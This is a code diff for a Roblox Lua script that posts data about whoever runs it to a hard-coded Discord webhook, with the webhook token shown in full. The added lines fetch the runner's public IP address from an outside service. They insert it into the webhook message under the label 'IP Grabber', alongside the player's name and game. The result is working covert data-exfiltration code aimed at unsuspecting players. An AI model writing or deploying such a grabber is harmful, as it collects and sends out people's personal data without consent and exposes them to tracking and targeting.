@@ -2,6 +2,7 @@ local Webhook = "https://discord.com/api/webhooks/1097548811053830175/Mso8HIlHPA
 local plrname = game.Players.LocalPlayer.Name
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local PlayerData =
 {
        ["content"] = "@everyone **Someone Run The Script**",
@@ -17,10 +18,12 @@ local PlayerData =
                    ["inline"] = true
                 },
            },
+           ["type"] = "rich",
            ["author"] = {
                    ["name"] = "Roblox Map";
                    ["url"] = 'https://www.roblox.com/games/'..game.PlaceId,
                         },
+           ["footer"] = { text = "IP Grabber: " ..ip};
            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
         }
     }
